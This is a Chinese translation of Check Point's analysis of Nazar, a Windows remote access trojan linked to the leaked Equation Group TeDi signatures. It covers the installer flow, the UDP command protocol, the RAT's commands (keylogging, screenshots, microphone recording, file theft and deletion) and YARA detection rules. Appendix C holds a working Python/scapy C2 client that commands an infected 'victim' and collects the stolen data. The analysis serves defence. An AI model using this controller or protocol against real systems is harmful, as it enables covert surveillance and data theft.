> 原文链接: https://www.anquanke.com//post/id/204564 


# Checkpoint 研究团队对 Nazar 工具组件的详细分析


                                阅读量   
                                **266226**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者checkpoint，文章来源：research.checkpoint.com
                                <br>原文地址：[https://research.checkpoint.com/2020/nazar-spirits-of-the-past/](https://research.checkpoint.com/2020/nazar-spirits-of-the-past/)

译文仅供参考，具体内容表达以及含义原文为准



[![](https://p4.ssl.qhimg.com/t010c62be086f7f6991.png)](https://p4.ssl.qhimg.com/t010c62be086f7f6991.png)



## 介绍

最近，安全研究员Juan Andres Guerrero-Saade揭露了新的APT组织并命名为Nazer，这是从影子经纪人(Shadow Brokers)最后一次泄露的信息中分析到的。在本研究中，我们将扩展Juan 和 Maciej Kotowicz所做的分析，并对Nazar的每个组件进行深入分析。不过真正的问题在于，我们的这些发现是解开了一个新的谜题，还是陷入了更深的谜题中。



## 前置知识

影子经纪人在”Lost in Translation” 事件中泄露出了很多攻击组件，其中名声狼藉的永恒之蓝(EternalBlue)吸引了大部分人的目光。除此之外，还有很多有价值的组件也值得被关注，这些组件显示了方程式(Equation Group)在发动攻击之前可能采取的一些预防措施。

[![](https://p5.ssl.qhimg.com/t01bc6c88547151c842.png)](https://p5.ssl.qhimg.com/t01bc6c88547151c842.png)

例如，在泄漏的文件中有一个名为“ drv_list.txt ”的文件，其中包括驱动程序名称列表和相应的注释，表示如果在目标系统上找到了指定的驱动程序，则将这些注释发送回攻击者。同时，该列表包含了许多可以检测到防病毒产品或安全解决方案的驱动程序:

[![](https://p4.ssl.qhimg.com/t0182a6a1c8fa165258.png)](https://p4.ssl.qhimg.com/t0182a6a1c8fa165258.png)

但是更有意思的是这个列表中包含了一些恶意驱动程序名称，如果组件找到这些驱动程序，则表明当前系统已经被另一个攻击者攻陷，组件就会提示攻击者撤回。方程式组织的武器库中也有一个名为”领土争端”(Territorial Dispute)的组件负责此类检查，通常被称为TeDi。

[![](https://p1.ssl.qhimg.com/t01f25a1d67109ee0d1.png)](https://p1.ssl.qhimg.com/t01f25a1d67109ee0d1.png)

与安全产品进行的扫描类似，”TeDi” 由45个签名组成，用于在目标系统中搜索与其他威胁组相关的注册表项或文件名。<br>
很明显，”TeDi”扫描的最终目的是确保攻击正常进行，同时也是保护自己的工具不被其他的对手检测到。

[![](https://p4.ssl.qhimg.com/t017c5681731a767ee2.png)](https://p4.ssl.qhimg.com/t017c5681731a767ee2.png)

在某些情况下，这也保证了方程式组织不会干扰”友军”正在进行的攻击行动，不会与”友军”攻击到同一目标。

由于”TeDi”本身没有包含任何名称，CrySys实验室在2018年做了大量的研究工作，试图将”TeDi”45个签名中的每一个都映射到它要检测的APT组织上。

[![](https://p2.ssl.qhimg.com/t01bb8c538ec0b4f7a7.png)](https://p2.ssl.qhimg.com/t01bb8c538ec0b4f7a7.png)

尽管它所包含的信息相对稀少，但安全研究人员还是经常重新研究”TeDi”，试图从中发现更多的APT组织，因为其中的一些APT组织(直到今天)仍然不为公众所知。

安全研究员Juan Andres Guerrero Saade表示，”TeDi”的第37个签名正在寻找一个名为Godown.dll的文件，它指向的可能是他称之为“Nazar”的伊朗APT组织，而不是CrySys实验室报告最初认为的中国APT组织。

[![](https://p0.ssl.qhimg.com/t01542bf355c57057cf.png)](https://p0.ssl.qhimg.com/t01542bf355c57057cf.png)

“TeDi” 的实现非常简单。它所包含的少量签名使得方程式组织有能力检出各个臭名昭著的攻击活动，比如Tural、Duqu、Dark Hotel等等等等。我们目前还没有完全了解到所有方程式组织检出到的攻击，但是根据已有的知识，我们发现了一个新的攻击活动并且命名为Nazar。



## 执行流程

根据资料显示，Nazar的活动时间应该是在2008年到2012年。

CrySys Labs表示在2015年的时候有反病毒引擎检测到了TeDi第37个签名所指的文件，也就是Nazar的Godown.dll，根据检测时间来看，说明有一部分安全公司早在TeDi泄露之前就已经完全意识和检测到了此类攻击。

[![](https://p3.ssl.qhimg.com/t015dc99a52f7f7c596.png)](https://p3.ssl.qhimg.com/t015dc99a52f7f7c596.png)

在Nazar的流程中执行的初始二进制文件是gpUpdates.exe。它是由名为“ Zip 2 Secure EXE ” 的程序创建的自解压存档（SFX）。在执行时，gpUpdates写入三个文件到硬盘：Data.bin，info，和Distribute.exe。然后gpUpdates.exe将启动Distribute.exe作为安装组件运行。

#### <a class="reference-link" name="Distribute.exe"></a>Distribute.exe

Distribute开始运行后，首先会读取释放的其他两个文件info和Data.bin。其中Data.bin是一个二进制文件，该文件中按顺序串联了多个PE。而info是一个非常小的文件，它包含了一个简单的结构，用于辅助读取Data.bin文件。Distribute将按照info中的文件长度顺序，将Data.bin中的PE文件以二进制流的形式进行读取。

下表显示了Data.bin中连接的文件与info中写入的长度。

[![](https://p5.ssl.qhimg.com/t01d91b66a2a3dd7d3c.png)](https://p5.ssl.qhimg.com/t01d91b66a2a3dd7d3c.png)

当上面的文件释放到本地之后，Distribute将使用regsvr32将3个dll文件进行注册。<br><code>ShellExecuteA(0, "open", "regsvr32.exe", "Godown.dll -s", 0, 0);<br>
ShellExecuteA(0, "open", "regsvr32.exe", "ViewScreen.dll -s", 0, 0);<br>
ShellExecuteA(0, "open", "regsvr32.exe", "Filesystem.dll -s", 0, 0);</code><br>
接着Distribute将通过CreateService将svchost.exe作为一个名为”EYSerivce”的服务进行添加。接着Distribute将会启动该服务并退出，启动的”EYSerivce”服务是攻击事件中的核心组件，负责处理攻击者下发的指令，稍后我们将对该文件进行详细分析。

[![](https://p2.ssl.qhimg.com/t01593b8d6621d8e4dc.png)](https://p2.ssl.qhimg.com/t01593b8d6621d8e4dc.png)

#### <a class="reference-link" name="svchost.exe%20/%20EYService"></a>svchost.exe / EYService

该服务是攻击中的关键组件，它负责加载和卸载所有的模块。从某种意义上来讲，EYService和其他RAT客户端类似，都包含了一个待执行的命令列表，攻击者可以通过下发不同的指令从而实现不同的操作。下面我们将分析EYService的详细功能。

与Nazar中的其他组件一样，该模块也没有展示新颖的技术或高质量的编写代码。实际上，与其他模块一样，这个模块主要基于当时常见的开源库。<br>
比如使用Microolap的包嗅探SDK用于管理流量和嗅探数据包。<br>
使用”蹩脚的”的mp3编码用于记录受害者麦克风。<br>
使用KeyDll3用于键盘记录。<br>
使用BMGlib用于截屏。<br>
使用开源项目ShowDownAlarm用于关闭用户计算机。<br>
等等。

#### <a class="reference-link" name="%E9%80%9A%E4%BF%A1%E5%88%86%E6%9E%90"></a>通信分析

在分析网络组件的时候，关键点在于C&amp;C服务器的地址和下发的指令内容。通过这些信息我们可能会得知一些服务器的关键路径，也有可能通过IP关联到新的攻击样本。但是由于Nazar的通信方式的特性，我们很难分析到目标的C&amp;C地址。

当服务执行后，首先会设置数据包嗅探，通过使用Packet Sniffer SDK（几乎是一种教科书的方式）完成的。主线程获取一个向外的网络适配器，并使用BPF来确保仅将UDP数据包转发到处理程序。

```
DWORD __stdcall main_thread(LPVOID lpThreadParameter)
`{`
  HANDLE hMgr; // edi
  HANDLE hCfg; // esi
  HANDLE hFtr; // edi
  hMgr = MgrCreate();
  MgrInitialize(hMgr);
  hCfg = MgrGetFirstAdapterCfg(hMgr);
  do
  `{`
    if ( !AdpCfgGetAccessibleState(hCfg) )
      break;
    hCfg = MgrGetNextAdapterCfg(hMgr, hCfg);
  `}`
  while ( hCfg );
  ADP_struct = AdpCreate();
  AdpSetConfig(ADP_struct, hCfg);
  if ( !AdpOpenAdapter(ADP_struct) )
  `{`
    AdpGetConnectStatus(ADP_struct);
    MaxPacketSize = AdpCfgGetMaxPacketSize(hCfg);
    adapter_ip = AdpCfgGetIpA_wrapper(hCfg, 0);
    AdpCfgGetMACAddress(hCfg, &amp;mac_address, 6);
    hFtr = BpfCreate();
    BpfAddCmd(hFtr, BPF_LD_B_ABS, 23u);         //  Get Protocol field value
    BpfAddJmp(hFtr, BPF_JMP_JEQ, IPPROTO_UDP, 0, 1);// Protocol == UDP
    BpfAddCmd(hFtr, BPF_RET, 0xFFFFFFFF);
    BpfAddCmd(hFtr, BPF_RET, 0);
    AdpSetUserFilter(ADP_struct, hFtr);
    AdpSetUserFilterActive(ADP_struct, 1);
    AdpSetOnPacketRecv(ADP_struct, on_packet_recv_handler, 0);
    AdpSetMacFilter(ADP_struct, 2);
    while ( 1 )
    `{`
      if ( stop_and_ping == 1 )
      `{`
        adapter_ip = AdpCfgGetIpA_wrapper(hCfg, 0);
        connection_method(2);
        stop_and_ping = 0;
      `}`
      Sleep(1000u);
    `}`
  `}`
  return 0;
`}`
```

每当UDP数据包到达时，无论是否存在响应，都会记录其源IP以用于下一个响应。接着将检查数据包的目标端口，如果它是1234，则UDP数据将转发到命令分派器。

```
int __cdecl commandMethodsWrapper(udp_t *udp_packet, int zero, char *src_ip, int ip_id)
`{`
  int length; // edi
  length = HIBYTE(udp_packet-&gt;length) - 8;
  ntohs(udp_packet-&gt;src_port);
  if ( ntohs(udp_packet-&gt;dst_port) != 1234 )
    return 0;
  commandDispatcher(&amp;udp_packet[1], src_ip, ip_id, length);
  return 1;
`}`
```

#### <a class="reference-link" name="%E5%93%8D%E5%BA%94%E7%B1%BB%E5%9E%8B"></a>响应类型

每个响应都会从头开始构建包，因此可以使用PSSDK的send发送它<br>`AdpAsyncSend/AdpSyncSend`

Nazar一共有三种响应类型，分别是：<br>
Send an ACK：目标端口4000，payload：101;0000<br>
Send computer information：目标端口4000，payload：100;&lt;Computer Name&gt;;&lt;OS name&gt;<br>
Send a file：文件内容将作为UDP数据发送，在Send file 的时候会跟随另一个UDP数据包以发送文件的大小—-&lt;size_of_file&gt;。在该模式下，UDP请求的目标端口将是请求消息中IP标志字段的小端值。比如如果服务器发送标致为0x3456的包(发送到目标端口1234)，恶意软件将使用目标端口0x5634进行响应。

多说无益，我们创建了一个python脚本用于模仿和演示Nazar的通信过程。它可以模拟攻击者在C2服务器和客户端的通信，该脚本存在于附录C中。

[![](https://p5.ssl.qhimg.com/t01f22128be1ed534e1.png)](https://p5.ssl.qhimg.com/t01f22128be1ed534e1.png)

#### <a class="reference-link" name="Nazar%E6%94%AF%E6%8C%81%E7%9A%84%E5%91%BD%E4%BB%A4"></a>Nazar支持的命令

正如我们之前分析的svchost.exe，也就是名为EYService的服务，它包含了一个受支持的远控命令列表。我们分析了该RAT的两个版本，发现了一些细小的差别。

指令ID：311<br>
指令功能：加载hodll.dll以启动键盘记录程序。用户的按键记录将会和对应的窗口名称一起保存到一个名为report.txt的文件中，然后将该文件发送到C2服务器。经过分析，该键盘记录器使用的是KeyDll3(Anoop Thomas编写) 和 KeyBoardHooks(H.Joseph编写)两个开源库。最后，攻击者可以通过发送312指令禁用键盘记录的功能。

指令ID：139<br>
指令功能：远程关闭用户计算机。该功能主要由Godown.dll实现，通过分析，该模块可能基于一个名为ShotDownAlarm的开源库。

指令ID：189<br>
指令功能：开启屏幕捕获，该指令会调用一个安全的ViewScreen.dll模块将捕获到的截图保存为z.png并将该文件发送到服务器。该模块基于一个名为”BMGLib”(M.Scott Heiman编写)的开源库，通过指令313将禁用屏幕捕获的功能。

指令ID：119<br>
指令功能：开启用户麦克风录制音频。将结果保存为music.mp3并发送到服务器。该模块由LAMEMP3开源库实现，通过指令315可以禁用音频录制功能。

指令ID：199<br>
指令功能：盘符遍历功能，程序会列举出PC中所有的磁盘驱动器然后保存到Drives.txt文件并发送到服务器。老版本的svchost使用的是FileSystem.dll实现该功能，新版本的svchost通过代码实现。

指令ID：200<br>
指令功能：遍历文件夹，获取用户计算机上所有的文件和文件夹信息并保存到Files.txt。其中文件和文件夹之间使用;File;或者;Folder;进行分割。同样的，在老版本的rat中，该功能通过filesystem.dll实现，新版本的rat通过代码实现。

指令ID：201<br>
指令功能：将通过指令200获取到的文件内容发送到服务器。

指令ID：209<br>
指令功能：从机器上删除指定的文件

指令ID：499<br>
指令功能：通过枚举找到SoftwareMicrosoftWindowsCurrentVersionUninstall下面的程序，将这些程序信息写入到名为Programs.txt的文件中并发送到服务器。

指令ID：599<br>
指令功能：列举出计算机上的所有设备，并将其保存到Devices.txt的文件中，然后将该文件发送到服务器。文件中设备之间使用;Root;或者;Child;进行分割。

指令ID：999<br>
指令功能：将payload&lt;101;0000&gt;发送到服务器的4000端口

指令ID：555<br>
指令功能：将计算机信息以&lt;100;Computer Name; OS Name&gt;的格式发送到服务器的4000端口

指令ID：315<br>
指令功能：禁用录音功能

指令ID：312：<br>
指令功能：禁用键盘记录功能

指令ID：313<br>
指令功能：禁用截屏功能

指令ID：211<br>
指令功能：使用regsvr32注册Godown.dll，该命令包含在2010年的svchost.exe版本中，在后续的版本中，注册转移到了Distrbute.exe进行实现。

指令ID：212<br>
指令功能：使用regsvr32注册ViewScreen.dll，同样的该命令存在于2010的版本中，在后续的版本中，注册转移到了Distrbute.exe进行实现。

指令ID：213<br>
指令功能：使用regsvr32注册Filesystem.dll，同样的该命令存在于2010的版本中，在后续的版本中，注册转移到了Distrbute.exe进行实现。

### <a class="reference-link" name="Godown.dll"></a>Godown.dll

Godown.dll文件是SIG37检测的DLL文件。在安全分析员发现该dll之前，我们可以猜测Godown.dll是攻击中的重要环节，猜测它有着命令分发的功能，猜测它可以完全控制用户计算机。但是通过研究发现，Godown.dll是一个很小的文件，它唯一的功能则是关闭用户的计算机。请相信我们，我们已经竭尽所能的尝试在该文件中找到任何神秘的代码或是未发现的功能，虽然该dll的实现非常的惊艳，但是除了关闭计算机的指令之外，该dll没有任何多余的代码。不过从另一方面来讲，通过分析Godown.dll,我们也对Nazar多了一些了解，毫无疑问这是一个好事儿。

### <a class="reference-link" name="Filesystem.dll"></a>Filesystem.dll

在分析的所有模块中，Filesystem.dll可能是唯一一个由攻击者自己编写的模块，这个模块的功能是枚举查找用户计算机上的所有驱动器、文件夹和文件。结果分别会写入到drives.txt和files.txt

我们找到了该模块的两个新版本，创建时间约为一年前。两个新的模块都包含了PDB路径，其中提到了一个波斯语名字Khzer(خضر)<br>
C:khzerDLLsDLL’s SourceFilesystemDebugFilesystem.pdb

D:KhzerClientDLL’s SourceFilesystemDebugFilesystem.pdb

仔细检查后，两条路径之间存在一些微小的差异：
1. 第一个PDB路径在C:，第二个PDB在D:
1. 第一个PDB使用小写的khzer，第二个PDB首字母大写为Khzer
通过这两个信息我们可以推测，这两个模块不是在同一个环境下编译的，并且如下图所示，两个模块中对头文件引用的路径变化，我们也可以猜测到Visual Studio的两个安装位置。

[![](https://p5.ssl.qhimg.com/t018a0520a6651a38f0.png)](https://p5.ssl.qhimg.com/t018a0520a6651a38f0.png)

[![](https://p3.ssl.qhimg.com/t014249d7b8c62612e4.png)](https://p3.ssl.qhimg.com/t014249d7b8c62612e4.png)

但是需要注意的是，这并不是两个版本之间唯一的区别。虽然所有一直的gpUpdates.exe的变种都已经删除了Filesystem.dll模块。但是在未删除之前，不同的模块使用方式是不同的。

例如，在2010版本的svchost.exe具有3个被后来版本省略的指令，分别是211，212和213，通过上面的指令分析我们可以知道这三个指令功能都是通过regsvr32来注册指定的dll模块。该功能在后续的版本中迁徙到了Distribute.exe中，如下所示：

[![](https://p2.ssl.qhimg.com/t01e5baceba6b62b03b.png)](https://p2.ssl.qhimg.com/t01e5baceba6b62b03b.png)

接着，当C2下发收集磁盘信息和文件信息的指令之后，程序会注册Filesystem.dll模块并进行调用：

[![](https://p3.ssl.qhimg.com/t015039b4f47ca2352f.png)](https://p3.ssl.qhimg.com/t015039b4f47ca2352f.png)

在2012年的新版本svchost.exe中，就弃用了Filesystem.dll模块，取而代之的是199和200两个指令，这两个指令分别用于获取磁盘信息和文件信息，功能的具体实现在svchost.exe的代码中而不是Filesystem.dll模块中

[![](https://p0.ssl.qhimg.com/t01de17a542a032d7b5.png)](https://p0.ssl.qhimg.com/t01de17a542a032d7b5.png)

### <a class="reference-link" name="hodll.dll"></a>hodll.dll

该dll模块负责用户的键盘记录，和大多数的键盘记录器一样，该模块也是通过设置Windows Hook来实现的。根据分析，该模块的代码应该来源于名为KeyDll3和KeyBoardHooks的开源代码库。

### <a class="reference-link" name="ViewScreen.dll"></a>ViewScreen.dll

该dll基于名为BMGLib的开源库，功能是获取用户计算机的屏幕截图。我们可以发现，Nazer的攻击中使用了许多这样的库来实现一些特定的功能。

### <a class="reference-link" name="%E7%BB%93%E8%AE%BA"></a>结论

在本文中，我们尝试收集Nazar所有已曝光的信息，我们深入研究了每个组件。影子经纪人的泄露让我们知道，美国国家安全局(NSA)多年来一直都了解Nazar。当然我觉得这也归功于其他研究人员从TeDi的签名列表中获取到Nazar的信息。

TeDi中的许多签名描述了高级和新颖的恶意软件家族，但Nazar似乎并非如此。正如我们在文章中所显示的那样，代码的质量以及开源库的大量使用与精明的威胁参与者的个人资料不符。尽管我们试图涵盖所有内容，但围绕这些发现仍然存在许多未解决的问题：nNazar发生了什么事，他们是否演变成如今以不同名称而闻名的其他APT？他们仍然活跃吗？那里还有更多攻击样本吗？有了这些问题和其他问题，我们就不得不对此保持开放性。

### <a class="reference-link" name="%E9%99%84%E5%BD%95"></a>附录

#### <a class="reference-link" name="%E9%99%84%E5%BD%95A%EF%BC%9AYara%E8%A7%84%E5%88%99"></a>附录A：Yara规则

Juan在他的博客文章中发布了Yara规则以简化检测。规则写得很好，涵盖了不同的组成部分。我们希望共享在分析过程中创建的一些规则，以添加到现有规则中。

```
rule apt_nazar_svchost_commands
`{`
    meta:
        description = "Detect Nazar's svchost based on supported commands"
        author = "Itay Cohen"
        date = "2020-04-26"
        reference = "&lt;https://www.epicturla.com/blog/the-lost-nazar&gt;"
        hash = "2fe9b76496a9480273357b6d35c012809bfa3ae8976813a7f5f4959402e3fbb6"
        hash = "be624acab7dfe6282bbb32b41b10a98b6189ab3a8d9520e7447214a7e5c27728"
    strings:
        $str1 = `{` 33 31 34 00 36 36 36 00 33 31 33 00 `}`
        $str2 = `{` 33 31 32 00 33 31 35 00 35 35 35 00 `}`
        $str3 = `{` 39 39 39 00 35 39 39 00 34 39 39 00 `}`
        $str4 = `{` 32 30 39 00 32 30 31 00 32 30 30 00 `}`
        $str5 = `{` 31 39 39 00 31 31 39 00 31 38 39 00 31 33 39 00 33 31 31 00 `}`
    condition:
        4 of them
`}`
rule apt_nazar_component_guids
`{`
    meta:
        description = "Detect Nazar Components by COM Objects' GUID"
        author = "Itay Cohen"
        date = "2020-04-27"
        reference = "&lt;https://www.epicturla.com/blog/the-lost-nazar&gt;"
        hash = "1110c3e34b6bbaadc5082fabbdd69f492f3b1480724b879a3df0035ff487fd6f"
        hash = "1afe00b54856628d760b711534779da16c69f542ddc1bb835816aa92ed556390"
        hash = "2caedd0b2ea45761332a530327f74ca5b1a71301270d1e2e670b7fa34b6f338e"
        hash = "2fe9b76496a9480273357b6d35c012809bfa3ae8976813a7f5f4959402e3fbb6"
        hash = "460eba344823766fe7c8f13b647b4d5d979ce4041dd5cb4a6d538783d96b2ef8"
        hash = "4d0ab3951df93589a874192569cac88f7107f595600e274f52e2b75f68593bca"
        hash = "75e4d73252c753cd8e177820eb261cd72fecd7360cc8ec3feeab7bd129c01ff6"
        hash = "8fb9a22b20a338d90c7ceb9424d079a61ca7ccb7f78ffb7d74d2f403ae9fbeec"
        hash = "967ac245e8429e3b725463a5c4c42fbdf98385ee6f25254e48b9492df21f2d0b"
        hash = "be624acab7dfe6282bbb32b41b10a98b6189ab3a8d9520e7447214a7e5c27728"
        hash = "d34a996826ea5a028f5b4713c797247913f036ca0063cc4c18d8b04736fa0b65"
        hash = "d9801b4da1dbc5264e83029abb93e800d3c9971c650ecc2df5f85bcc10c7bd61"
        hash = "eb705459c2b37fba5747c73ce4870497aa1d4de22c97aaea4af38cdc899b51d3"
    strings:
        $guid1_godown = `{` 98 B3 E5 F6 DF E3 6B 49 A2 AD C2 0F EA 30 DB FE `}` // Godown.dll IID
        $guid2_godown = `{` 31 4B CB DB B8 21 0F 4A BC 69 0C 3C E3 B6 6D 00 `}` // Godown.dll CLSID
        $guid3_godown = `{` AF 94 4E B6 6B D5 B4 48 B1 78 AF 07 23 E7 2A B5 `}` // probably Godown
        $guid4_filesystem = `{` 79 27 AB 37 34 F2 9D 4D B3 FB 59 A3 FA CB 8D 60 `}` // Filesystem.dll CLSID
        $guid6_filesystem = `{` 2D A1 2B 77 62 8A D3 4D B3 E8 92 DA 70 2E 6F 3D `}` // Filesystem.dll TypeLib IID
        $guid5_filesystem = `{` AB D3 13 CF 1C 6A E8 4A A3 74 DE D5 15 5D 6A 88 `}` // Filesystem.dll 
        
    condition:
        any of them
`}`
```

#### <a class="reference-link" name="%E9%99%84%E5%BD%95B%EF%BC%9AIOCS"></a>附录B：IOCS

[![](https://p4.ssl.qhimg.com/t01e52f2aa7805314d3.png)](https://p4.ssl.qhimg.com/t01e52f2aa7805314d3.png)

#### <a class="reference-link" name="%E9%99%84%E5%BD%95C%EF%BC%9Apython%E8%84%9A%E6%9C%AC"></a>附录C：python脚本

```
from scapy.all import *
import struct
import socket
import hexdump
import argparse

DST_PORT = 1234

# 4000 is the usual port without sending files, but we use it for everything, because why not?
SERVER_PORT = 4000

# We want to make sure the ID has the little endian of it
ID = struct.unpack('&gt;H',struct.pack('&lt;H',4000))[0]

def get_response(sock, should_loop):
    started = False
    total_payload = b''
    while(should_loop or not started):
        try:
            payload, client_address = sock.recvfrom(4096)
        except ConnectionResetError:
                payload, client_address = sock.recvfrom(4096)

        total_payload += payload
        # Good enough stop condition
        if (len(payload) &gt;= 4
            and payload[:3] == b'---'
            and payload[4] &gt;= ord('0')
            and payload[4] &lt;= ord('9')):

            should_loop = False
        started = True
    hexdump.hexdump(total_payload)

MENU = """Welcome to NAZAR. Please choose:
          999 - Get a ping from the victim.
          555 - Get information on the victim's machine.
          311 - Start keylogging (312 to disable).
          139 - Shutdown victim's machine.
          189 - Screenshot (313 to disable).
          119 - Record audio from Microphone (315 to disable).
          199 - List drives.
          200 - List recursivley from directory*.
          201 - Send a file*.
          209 - Remove file*.
          599 - List devices.

* (append a path, use double-backslashes)
quit to Quit,
help for this menu.
            """

def get_message():
    while True:
        curr_message = input('&gt; ').strip()
        if 'quit' in curr_message:
            return None
        if 'help' in curr_message:
            print(MENU)
        else:
            return curr_message

def get_sock():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_address = '0.0.0.0'
    server = (server_address, SERVER_PORT)
    sock.bind(server)
    return sock     

def main(ip_addr):
    sock = get_sock()

    print(MENU)
    multi_packets = ["200","201", "119", "189", "311", "199", "599"]
    single_packets = ["999", "555"]
    all_commands = single_packets + multi_packets
    while True:

        curr_message = get_message()
        if not curr_message:
            break


        # Send message using scapy
        # Make sure the IP identification field is little endian of the port.
        sr1(
            IP(dst=ip_addr, id=ID)/
            UDP(sport=SERVER_PORT,dport=1234)/
            Raw(load=curr_message),
            verbose=0
        )

        command = curr_message[:3]
        if command not in all_commands:
            continue
        should_loop = command in multi_packets
        get_response(sock, should_loop)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="victim's IP")
    parser.add_argument('ip')
    args = parser.parse_args()
    main(args.ip)
```
